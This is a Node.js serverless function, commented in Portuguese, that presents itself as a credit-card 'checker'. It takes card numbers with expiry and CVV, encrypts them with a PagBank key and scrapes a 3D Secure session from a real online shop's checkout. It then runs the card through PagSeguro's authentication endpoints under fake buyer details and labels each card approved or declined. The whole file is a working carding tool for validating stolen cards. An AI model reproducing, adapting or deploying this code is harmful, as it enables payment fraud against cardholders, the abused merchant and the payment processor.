/*
===========================================
     CHECKER DE CARTÕES - VBV/3D SECURE
          NODE.JS VERSION FOR VERCEL
===========================================

COMO USAR:
- URL: https://seusite.vercel.app/api/checker?lista=NUMERO|MES|ANO|CVV
- Exemplos:
  ?lista=5122672221909912|02|2031|386
  ?lista=4111111111111111|12|2025|123

FUNCIONALIDADES:
✅ Detecta marca do cartão (Visa, Mastercard, etc)
✅ Identifica banco emissor pelo BIN  
✅ Processa 3D Secure (VBV/SecureCode)
✅ Analisa respostas dos bancos brasileiros
✅ Tratamento avançado de mensagens VBV
===========================================
*/

const axios = require('axios');
const forge = require('node-forge');
const cheerio = require('cheerio');
const { CookieJar } = require('tough-cookie');

// Chave pública do PagBank
const PAGBANK_PUBLIC_KEY = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAohY3No2y7wJ3mmynx81tfeCnmd80k6c4ZiacJuLG7dP1JscTu0ivKXs5H+DClSKMIlKESm4XF4kUDvuFWqfz1c/NlzeGZ2ZA1EPByxLMyRDwxBT2aaxs6AB/VZ1NFJ2hiUrM96T86KljA/sPhGYqCAw5NAXMp4RhrYDrhw6b//DVzihiXxth/3UQC3FeRqcJhU7znwPTmkFqIjpFBUK7vTjqQ8eC/03vijL99/mn1ikLXogk4D109nO8wV3NAliW/9Ai3eslPKLH9dI/UgKlEh+qdnjo99hVr93Q3Mn4FX++tBh5UFA5q5fxV+8mSREG0aIq4Sgi6VcK0wKp6BkyqwIDAQAB';

// Função para detectar marca do cartão
function detectCardBrand(number) {
    const num = number.replace(/\D/g, '');
    const patterns = {
        'VISA': /^4[0-9]{12}(?:[0-9]{3})?$/,
        'MASTERCARD': /^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/,
        'AMEX': /^3[47][0-9]{13}$/,
        'DISCOVER': /^6(?:011|5[0-9]{2})[0-9]{12}$/,
        'DINERS': /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
        'JCB': /^(?:2131|1800|35\d{3})\d{11}$/,
        'ELO': /^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/,
        'HIPERCARD': /^(606282\d{10}(\d{3})?)|(3841\d{15})$/,
        'AURA': /^50[0-9]{14,17}$/
    };
    
    for (const [brand, pattern] of Object.entries(patterns)) {
        if (pattern.test(num)) {
            return brand;
        }
    }
    return 'UNKNOWN';
}

// Função para detectar banco pelo BIN
function detectBankFromBin(bin) {
    const banks = {
        // Itaú
        '4011': 'ITAU', '4012': 'ITAU', '4013': 'ITAU', '4014': 'ITAU',
        '4515': 'ITAU', '4516': 'ITAU', '4517': 'ITAU', '4518': 'ITAU',
        // Bradesco
        '4551': 'BRADESCO', '4902': 'BRADESCO', '4903': 'BRADESCO',
        '5555': 'BRADESCO', '5556': 'BRADESCO',
        // Santander
        '5448': 'SANTANDER', '5449': 'SANTANDER', '4001': 'SANTANDER', '4002': 'SANTANDER',
        // Banco do Brasil
        '4389': 'BANCO_DO_BRASIL', '4390': 'BANCO_DO_BRASIL', 
        '5067': 'BANCO_DO_BRASIL', '5068': 'BANCO_DO_BRASIL',
        // Caixa
        '4514': 'CAIXA', '5501': 'CAIXA', '5502': 'CAIXA',
        // Nubank
        '5162': 'NUBANK', '5163': 'NUBANK',
        // Sicredi
        '5122': 'SICREDI', '5123': 'SICREDI',
        // BTG
        '5277': 'BTG', '5278': 'BTG',
        // Inter
        '4444': 'INTER', '5566': 'INTER',
        // C6 Bank
        '5225': 'C6_BANK', '5226': 'C6_BANK'
    };
    
    const bin4 = bin.substring(0, 4);
    return banks[bin4] || 'UNKNOWN';
}

// Função para criptografar dados do cartão
function encryptCard(number, month, year, cvv) {
    try {
        const pan = number.replace(/\D/g, '');
        const formattedMonth = month.padStart(2, '0');
        const formattedYear = year.length === 2 ? '20' + year : year;
        const holder = "TITULAR DO CARTAO";
        const timestamp = Date.now();
        
        const payload = `${pan};${cvv};${formattedMonth};${formattedYear};${holder};${timestamp}`;
        
        // Formatar chave pública
        const pemKey = `-----BEGIN PUBLIC KEY-----\n${PAGBANK_PUBLIC_KEY.match(/.{1,64}/g).join('\n')}\n-----END PUBLIC KEY-----`;
        
        // Usar node-forge para criptografia RSA
        const publicKey = forge.pki.publicKeyFromPem(pemKey);
        const encrypted = publicKey.encrypt(payload, 'RSAES-PKCS1-V1_5');
        
        return forge.util.encode64(encrypted);
    } catch (error) {
        console.error('Erro na criptografia:', error);
        return null;
    }
}

// Função para limpar HTML
function cleanHtml(text) {
    if (!text) return "";
    
    // Remove scripts e styles
    text = text.replace(/<script[^>]*>.*?<\/script>/gis, '');
    text = text.replace(/<style[^>]*>.*?<\/style>/gis, '');
    
    // Entidades HTML
    const replacements = {
        '&nbsp;': ' ', '&amp;': '&', '&lt;': '<', '&gt;': '>',
        '&quot;': '"', '&apos;': "'", '&hellip;': '...',
        '&aacute;': 'á', '&Aacute;': 'Á', '&agrave;': 'à', '&Agrave;': 'À',
        '&acirc;': 'â', '&Acirc;': 'Â', '&atilde;': 'ã', '&Atilde;': 'Ã',
        '&eacute;': 'é', '&Eacute;': 'É', '&egrave;': 'è', '&Egrave;': 'È',
        '&ecirc;': 'ê', '&Ecirc;': 'Ê', '&iacute;': 'í', '&Iacute;': 'Í',
        '&igrave;': 'ì', '&Igrave;': 'Ì', '&icirc;': 'î', '&Icirc;': 'Î',
        '&oacute;': 'ó', '&Oacute;': 'Ó', '&ograve;': 'ò', '&Ograve;': 'Ò',
        '&ocirc;': 'ô', '&Ocirc;': 'Ô', '&otilde;': 'õ', '&Otilde;': 'Õ',
        '&uacute;': 'ú', '&Uacute;': 'Ú', '&ugrave;': 'ù', '&Ugrave;': 'Ù',
        '&ucirc;': 'û', '&Ucirc;': 'Û', '&ccedil;': 'ç', '&Ccedil;': 'Ç',
        '&#225;': 'á', '&#224;': 'à', '&#226;': 'â', '&#227;': 'ã',
        '&#233;': 'é', '&#232;': 'è', '&#234;': 'ê', '&#237;': 'í',
        '&#236;': 'ì', '&#238;': 'î', '&#243;': 'ó', '&#242;': 'ò',
        '&#244;': 'ô', '&#245;': 'õ', '&#250;': 'ú', '&#249;': 'ù',
        '&#251;': 'û', '&#231;': 'ç'
    };
    
    for (const [entity, char] of Object.entries(replacements)) {
        text = text.replace(new RegExp(entity, 'g'), char);
    }
    
    // Remove tags HTML e normaliza espaços
    text = text.replace(/<br\s*\/?>/gi, '\n');
    text = text.replace(/<[^>]*>/g, ' ');
    text = text.replace(/\s+/g, ' ');
    
    return text.trim();
}

// Função para extrair campos do banco
function extractBankFields(html) {
    const $ = cheerio.load(html);
    
    // Padrões para diferentes bancos
    const selectors = [
        // Mensagens gerais
        'p[id="Body1"]', '.challengeInfoText', '.container_body_text', '#info_message_auth',
        // Itaú
        '.mensagem', '.texto', '#textoMensagem',
        // Bradesco
        '[id*="mensagem"]', '.content', '.bradesco-message',
        // Santander
        '.santander', '[id*="content"]', '#mainContent',
        // Sicredi
        '.sicredi', '.info', '.message-container',
        // Nubank
        '.nu', '.purple',
        // Banco do Brasil
        '.bb', '[id*="bb"]',
        // Caixa
        '.caixa', '.azul',
        // Genéricos
        '.error', '.success', '.alert', '.warning'
    ];
    
    for (const selector of selectors) {
        const element = $(selector);
        if (element.length) {
            const text = cleanHtml(element.text());
            if (text && text.length > 3) {
                return text;
            }
        }
    }
    
    // Fallback: extrair qualquer texto visível
    const bodyText = cleanHtml($('body').text());
    if (bodyText && bodyText.length > 10) {
        return bodyText.substring(0, 200) + (bodyText.length > 200 ? '...' : '');
    }
    
    return "mensagem vbv não capturada";
}

// Função para analisar mensagem VBV
function analyzeVbvMessage(message) {
    const msgLower = message.toLowerCase();
    
    const approvalKeywords = [
        'aprovada', 'sucesso', 'autorizada', 'confirmada', 'concluida',
        'success', 'approved', 'authorized', 'confirmed', 'completed',
        'para concluir', 'acesse seu aplicativo', 'confirme a transação',
        'transação autorizada', 'compra aprovada'
    ];
    
    const declineKeywords = [
        'negada', 'recusada', 'reprovada', 'rejeitada', 'cancelada',
        'declined', 'denied', 'rejected', 'failed', 'error',
        'cartão inválido', 'dados incorretos', 'transação negada',
        'compra não autorizada', 'limite insuficiente', 'cartão bloqueado'
    ];
    
    for (const keyword of approvalKeywords) {
        if (msgLower.includes(keyword)) return 'APPROVED';
    }
    
    for (const keyword of declineKeywords) {
        if (msgLower.includes(keyword)) return 'DECLINED';
    }
    
    return 'UNKNOWN';
}

// Função para parsing do cartão
function parseCard(cardString) {
    if (!cardString) return null;
    
    const parts = cardString.split('|');
    if (parts.length !== 4) return null;
    
    const [cc, mes, ano, cvv] = parts;
    
    return {
        cc: cc.replace(/\D/g, ''),
        mes: mes.padStart(2, '0'),
        ano: ano,
        ano2: ano.length === 2 ? ano : ano.substring(2),
        cvv: cvv,
        full: cardString
    };
}

// Função principal do checker
export default async function handler(req, res) {
    const startTime = Date.now();
    
    try {
        // Parse do cartão
        const card = parseCard(req.query.lista);
        if (!card) {
            return res.status(400).json({ error: 'Lista inválida!' });
        }
        
        const { cc, mes, ano2, cvv, full } = card;
        
        // Detecta marca e banco
        const detectedBrand = detectCardBrand(cc);
        const detectedBank = detectBankFromBin(cc);
        const cardInfo = `[${detectedBrand} - ${detectedBank}]`;
        
        // Criptografa o cartão
        const encryptedHash = encryptCard(cc, mes, ano2, cvv);
        if (!encryptedHash) {
            const elapsed = Math.round((Date.now() - startTime) / 1000);
            return res.json({
                status: 'Reprovada',
                card: full,
                message: '[Erro na criptografia]',
                info: cardInfo,
                time: `${elapsed}s`
            });
        }
        
        // Configurar cookie jar
        const cookieJar = new CookieJar();
        const axiosInstance = axios.create({
            timeout: 30000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            }
        });
        
        // Adicionar produto ao carrinho
        await axiosInstance.get('https://conteudoemais.com.br/finalizar-compra/?add-to-cart=30157');
        
        // Obter página de checkout
        const checkoutResponse = await axiosInstance.get('https://conteudoemais.com.br/finalizar-compra/');
        const psSessionMatch = checkoutResponse.data.match(/var pagseguro_connect_3d_session = '([^']+)'/);
        
        if (!psSessionMatch) {
            const elapsed = Math.round((Date.now() - startTime) / 1000);
            return res.json({
                status: 'Reprovada',
                card: full,
                message: '[Erro ao capturar o session 3d]',
                info: cardInfo,
                time: `${elapsed}s`
            });
        }
        
        const psSession = psSessionMatch[1];
        
        // Payload para autenticação 3D Secure
        const authPayload = {
            paymentMethod: {
                type: "CREDIT_CARD",
                installments: 1,
                card: {
                    encrypted: encryptedHash
                }
            },
            dataOnly: false,
            customer: {
                name: "Nocyam Solo",
                email: "geudgziwb@gmail.com",
                phones: [{
                    country: "55",
                    area: "14", 
                    number: "998543793",
                    type: "MOBILE"
                }]
            },
            amount: {
                value: 999,
                currency: "BRL"
            },
            billingAddress: {
                street: "Rua Conde de Baependi, 14",
                number: "n/d",
                complement: "n/d", 
                regionCode: "SP",
                country: "BRA",
                city: "Rio de janeiro",
                postalCode: "22231140"
            },
            deviceInformation: {
                httpBrowserColorDepth: 24,
                httpBrowserJavaEnabled: false,
                httpBrowserJavaScriptEnabled: true,
                httpBrowserLanguage: "pt-BR",
                httpBrowserScreenHeight: 412,
                httpBrowserScreenWidth: 915,
                httpBrowserTimeDifference: 180,
                httpDeviceChannel: "Browser",
                userAgentBrowserValue: "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
            }
        };
        
        // Requisição de autenticação
        const authResponse = await axiosInstance.post(
            'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications',
            authPayload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': psSession
                }
            }
        );
        
        const authData = authResponse.data;
        const threeDsId = authData.id;
        
        if (!threeDsId) {
            const status = authData.status || authData.message || 'Falha na autenticação';
            const elapsed = Math.round((Date.now() - startTime) / 1000);
            return res.json({
                status: 'Reprovada',
                card: full,
                message: `[${status}]`,
                info: cardInfo,
                time: `${elapsed}s`
            });
        }
        
        // Confirmação da autenticação
        const confirmResponse = await axiosInstance.post(
            `https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/${threeDsId}`,
            '',
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': psSession
                }
            }
        );
        
        const confirmData = confirmResponse.data;
        const elapsed = Math.round((Date.now() - startTime) / 1000);
        
        if (confirmData.status === 'SUCCESS') {
            return res.json({
                status: 'Aprovada',
                card: full,
                message: 'transaction success',
                info: cardInfo,
                time: `${elapsed}s`
            });
        } else if (confirmData.status === 'REQUIRE_CHALLENGE') {
            const challenge = confirmData.challenge || {};
            const acsUrl = challenge.acsUrl;
            const creq = challenge.payload;
            
            if (acsUrl && creq) {
                const challengeResponse = await axiosInstance.post(acsUrl, `creq=${creq}`, {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                });
                
                const message = extractBankFields(challengeResponse.data);
                const analysis = analyzeVbvMessage(message);
                
                const status = analysis === 'DECLINED' || 
                               message.toLowerCase().includes('compra não concluída') ||
                               message.toLowerCase().includes('reprovada') ||
                               message.toLowerCase().includes('inválido') ? 'Reprovada' : 'Aprovada';
                
                return res.json({
                    status,
                    card: full,
                    message,
                    info: cardInfo,
                    time: `${elapsed}s`
                });
            } else {
                return res.json({
                    status: 'Reprovada',
                    card: full,
                    message: 'invalid challenger',
                    info: cardInfo,
                    time: `${elapsed}s`
                });
            }
        } else {
            const status = confirmData.status || 'DECLINED';
            const message = confirmData.message || status;
            
            return res.json({
                status: 'Reprovada',
                card: full,
                message,
                info: cardInfo,
                time: `${elapsed}s`
            });
        }
        
    } catch (error) {
        console.error('Erro no checker:', error);
        const elapsed = Math.round((Date.now() - startTime) / 1000);
        
        return res.status(500).json({
            status: 'Reprovada',
            card: req.query.lista || 'unknown',
            message: '[Erro interno do servidor]',
            info: '[UNKNOWN - UNKNOWN]',
            time: `${elapsed}s`
        });
    }
}